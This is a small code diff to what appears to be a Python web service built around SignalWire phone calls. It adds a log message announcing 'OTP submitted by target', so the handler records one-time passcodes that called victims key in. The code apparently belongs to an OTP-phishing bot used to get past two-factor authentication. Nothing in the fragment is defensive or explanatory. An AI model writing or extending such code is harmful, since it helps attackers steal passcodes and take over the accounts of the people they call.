@@ -163,6 +163,7 @@ async def signalwire_deny(call_id: str, request: Request, Digits: str = Form(Non
             event = {
                 'time': datetime.utcnow().isoformat(),
                 'event': 'otp_received',
+                'message': f'🕵️ OTP submitted by target: {Digits}',
                 'data': {'otp': Digits}
             }
             
